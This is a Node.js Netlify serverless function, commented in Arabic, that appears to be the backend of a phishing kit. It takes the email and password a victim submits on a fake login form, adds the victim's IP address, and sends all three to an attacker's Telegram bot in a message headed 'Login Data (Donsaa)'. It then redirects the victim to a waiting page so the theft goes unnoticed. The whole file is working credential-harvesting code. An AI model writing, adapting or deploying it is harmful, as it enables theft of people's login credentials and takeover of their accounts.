const fetch = require('node-fetch');

// دالة مساعدة لجلب IP من رؤوس مختلفة (لبيئة Netlify)
const getClientIp = (headers) => {
    // محاولة التقاط IP من الرؤوس الأكثر موثوقية في Netlify
    return headers['x-nf-client-connection-ip'] || 
           headers['client-ip'] || 
           headers['x-forwarded-for'] ||
           'غير متوفر';
};

// دالة ترميز الأحرف الخاصة بـ MarkdownV2 لـ Telegram
const escapeMarkdownV2 = (text) => {
    const replacements = {
        '\\': '\\\\', '_': '\\_', '*': '\\*', '[': '\\[', ']': '\\]', 
        '(': '\\(', ')': '\\)', '~': '\\~', '`': '\\`', '>': '\\>', 
        '#': '\\#', '+': '\\+', '-': '\\-', '=': '\\=', '|': '\\|', 
        '{': '\\{', '}': '\\}', '.': '\\.', '!': '\\!'
    };
    return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
};


exports.handler = async (event, context) => {
    
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }
    
    // فك ترميز بيانات النموذج
    const bodyParams = new URLSearchParams(event.body);
    
    const email = bodyParams.get('login_email') || 'غير متوفر';
    const password = bodyParams.get('login_password') || 'غير متوفر';
    
    // التقاط IP باستخدام الدالة المساعدة
    const ip = getClientIp(event.headers); 

    // تطبيق الترميز على المتغيرات
    const safe_email = escapeMarkdownV2(email);
    const safe_password = escapeMarkdownV2(password);
    const safe_ip = escapeMarkdownV2(ip);
    
    // تشكيل الرسالة
    let message_text = `👤 *Login Data \\(Donsaa\\)* 👤\n\n`;
    message_text += `E\\-Mail: \`${safe_email}\`\n`;
    message_text += `Passwort: \`${safe_password}\`\n`;
    message_text += `IP: \`${safe_ip}\``; 

    // إعدادات Telegram
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error("Telegram credentials missing in environment variables.");
        // التحويل إلى الصفحة التالية حتى في حالة الخطأ
        return { statusCode: 303, headers: { Location: '/waiting.html' } };
    }

    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message_text,
        parse_mode: 'MarkdownV2',
    };

    // إرسال البيانات إلى Telegram
    try {
        await fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (error) {
        console.error("Error sending message to Telegram:", error);
    }
    
    // التحويل إلى صفحة الانتظار
    return {
        statusCode: 303,
        headers: {
            Location: '/waiting.html',
        },
    };
};
